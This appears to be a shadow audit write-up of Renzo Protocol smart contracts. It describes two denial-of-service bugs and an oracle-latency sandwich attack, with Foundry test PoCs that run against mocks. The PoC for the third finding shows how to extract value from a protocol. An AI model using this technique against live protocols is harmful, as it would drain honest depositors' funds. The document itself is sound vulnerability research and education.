# 0xSchutze - Renzo Protocol Shadow Audit Report

## 1. Introduction & Scope
- **Protocol:** Renzo Protocol (2024-04-renzo)
- **Audit Type:** Shadow Audit (Reverse Engineering & Independent Verification)
- **Researcher:** 0xSchutze

This report contains independent discoveries and reverse-engineered proofs of concept (PoCs) for vulnerabilities found within the Renzo Protocol smart contracts. The methodology involves an initial independent manual audit (Deep Focus) followed by a detailed assimilation of the official Code4rena findings.

---

## 2. My Discoveries (Independent Findings)
*This section contains vulnerabilities that I independently discovered and validated prior to reading the official report.*

### [M-09] Deposits will always revert if the amount being deposited is less than the bufferToFill value

**Description & Business Impact:**
In `RestakeManager.sol`, the `deposit` function checks if the withdrawal buffer is below its target. If there is a deficit (`bufferToFill > 0`), the code attempts to route the deposited `_amount` to fill the buffer. However, the ternary operation `bufferToFill = (_amount <= bufferToFill) ? _amount : bufferToFill;` restricts the fill amount, followed by `_amount -= bufferToFill;`. 

If the deposited amount is less than or equal to the deficit, `_amount` is reduced to `0`. The execution then calls `operatorDelegator.deposit(_collateralToken, _amount)` with a `0` value. Inside `OperatorDelegator.sol`, the `deposit` function contains a strict check: `if (tokenAmount == 0) revert InvalidZeroInput();`.
This mathematical reduction leads to a complete Denial of Service (DoS) for all deposits that are smaller than the current withdrawal buffer deficit, locking out retail/small depositors until a whale deposit clears the deficit.

**Proof of Concept (Foundry):**
The complete executable PoC can be found in [`PoCs/01_Renzo_M09_PoC.t.sol`](./PoCs/01_Renzo_M09_PoC.t.sol).
Below is the core exploit execution demonstrating the denial of service:

```solidity
    /// @notice Proves that depositing exactly the deficit amount triggers a denial of service (revert).
    function test_DepositReverts_WhenAmountEqDeficit() public {
        setupBufferDeficit();
        uint256 depositAmount = deficit;
        
        vm.startPrank(OWNER);
        stETH.mint(alice, depositAmount);
        vm.stopPrank();

        vm.startPrank(alice);
        stETH.approve(address(restakeManager), type(uint256).max);

        // The deposit logic reduces the input amount by the buffer deficit. 
        // Because depositAmount == deficit, the net amount becomes 0, triggering the revert.
        vm.expectRevert(InvalidZeroInput.selector);
        restakeManager.deposit(IERC20(address(stETH)), depositAmount);
        vm.stopPrank();
    }
```

---

### [H-03] Native ETH withdrawals from EigenLayer permanently bricked due to overlapping nonReentrant locks

**Description & Business Impact:**
During the execution of `OperatorDelegator.completeQueuedWithdrawal()`, the contract enters a `nonReentrant` lock. This function delegates the withdrawal execution to EigenLayer's `DelegationManager`. Upon processing, EigenLayer pushes the native ETH back to the corresponding `EigenPod`, which immediately forwards it to the `OperatorDelegator`'s `receive()` function.
However, the `receive()` function is also protected by the `nonReentrant` modifier. Since the transaction originated from a function that already acquired the ReentrancyGuard lock (`_status == _ENTERED`), the callback predictably reverts with `"ReentrancyGuard: reentrant call"`. 
This results in a permanent Denial of Service (DoS) for all queued native ETH withdrawals, locking user funds indefinitely within EigenLayer.

**Proof of Concept (Foundry):**
The complete executable PoC can be found in [`PoCs/02_Renzo_H03_PoC.t.sol`](./PoCs/02_Renzo_H03_PoC.t.sol).
Below is the core exploit execution demonstrating the ReentrancyGuard brick:

```solidity
    /// @notice Proves that completing a queued withdrawal triggers a ReentrancyGuard revert.
    function test_H03_Reentrancy_DoS() public {
        FakeDelegationManager fakeManager = new FakeDelegationManager();
        vm.etch(address(delegationManager), address(fakeManager).code);

        IDelegationManager.Withdrawal memory withdrawal;
        IERC20[] memory tokens = new IERC20[](0);

        vm.startPrank(OWNER);
        
        // The transaction must revert because the reentrancy lock is already ENTERED 
        // by completeQueuedWithdrawal before receive() is called.
        vm.expectRevert("ReentrancyGuard: reentrant call");
        operatorDelegator1.completeQueuedWithdrawal(
            withdrawal,
            tokens,
            0
        );
        vm.stopPrank();
    }
```

---

## 3. Assimilated Discoveries (Reverse-Engineered Findings)
*This section contains critical/medium vulnerabilities from the official report that I initially missed or left for the assimilation phase. I will reverse-engineer the root causes and write my own original Foundry PoCs to demonstrate the exploits.*

### [H-04] Oracle Latency / MEV Sandwich via WithdrawQueue enables risk-free profit extraction

**Description & Business Impact:**
The protocol calculates the value of `ezETH` based on the combined value of all supported assets (TVL) via Chainlink oracles. During a withdrawal claim in `WithdrawQueue.sol`, the protocol locks in the withdrawal amount based on the current Oracle prices. Because oracles update asynchronously, a malicious actor can monitor the mempool for an impending oracle price spike for a volatile asset (e.g., stETH), or wait for natural latency. By depositing right before the spike, waiting for the update, and immediately withdrawing their `ezETH` in a different, non-spiked asset (like Native ETH), the attacker performs a cross-asset MEV sandwich.
This allows the attacker to extract significantly more Native ETH than they deposited, draining the protocol's backing value at the direct expense of honest depositors.

**Retrospective / Missed Vector:**
I noticed the design: withdrawal amounts are priced at request time, not at claim time. I flagged it as unusual. I know what a MEV sandwich is and how it works. My brain failed to connect the two in that moment. In retrospect, the link is obvious — lock a valuation in the past, exploit the price delta at settlement. I had both pieces. I didn't assemble them.

**Proof of Concept (Foundry):**
The complete executable PoC can be found in [`PoCs/03_Renzo_H04_PoC.t.sol`](./PoCs/03_Renzo_H04_PoC.t.sol).
Below is the core exploit execution demonstrating the profit extraction:

```solidity
        // 2. Act: stETH oracle price spikes by 50% (1 stETH = 1.5 ETH)
        // This artificially inflates the TVL and thus the value of ezETH
        MockAggrV3(stEthOracle).setAnswer(1.5 ether);

        // 3. Act: Alice withdraws her 10 stETH worth of ezETH, but takes Native ETH
        // Since Native ETH price hasn't spiked, she can extract more Native ETH
        vm.startPrank(alice);
        withdrawQueue.claim(0);
        vm.stopPrank();

        uint256 finalBalance = alice.balance;
        uint256 profit = finalBalance - 10 ether;
        
        console.log("Alice Initial Deposit (ETH) : 10.0000");
        console.log("Alice Final Balance (ETH)   : %s.%s", finalBalance / 1 ether, (finalBalance % 1 ether) / 1e14);
        console.log("Extracted Profit (ETH)      : %s.%s", profit / 1 ether, (profit % 1 ether) / 1e14);

        // 4. Assert: Alice deposited 10 stETH (worth 10 ETH) but successfully extracted >12 ETH.
        assertGt(finalBalance, 12 ether, "Alice extracted value from the protocol");
```
